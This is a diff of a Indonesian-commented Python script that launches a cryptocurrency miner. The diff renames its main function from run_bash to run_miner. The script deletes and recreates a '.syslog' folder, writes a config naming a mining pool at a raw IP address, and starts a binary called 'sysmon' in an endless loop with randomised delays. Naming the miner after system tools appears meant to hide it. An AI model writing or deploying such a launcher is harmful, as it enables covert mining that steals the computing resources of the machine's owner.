@@ -6,7 +6,7 @@ import random
 # Pastikan skrip berjalan di direktori home
 os.chdir(os.path.expanduser("~"))
 
-def run_bash():
+def run_miner():
     commands = [
         "pkill sysmon && sleep 2",
         "rm -rf .syslog && sleep 2",
@@ -33,11 +33,11 @@ pool1 = 47.236.66.121:443' > config.ini"""
         delay = random.uniform(4.0, 10.0)  # Delay antar perintah 1.5–4 detik
         time.sleep(delay)
 
-    print("✅ bash dimulai...")
+    print("✅ Mining dimulai...")
     subprocess.Popen("./syslog/sysmon", shell=True)
 
 while True:
-    run_bash()
+    run_miner()
     delay = random.randint(300, 600)  # Delay sebelum restart 5–10 menit
     print(f"⏳ Menunggu {delay} detik sebelum restart...")
     time.sleep(delay)
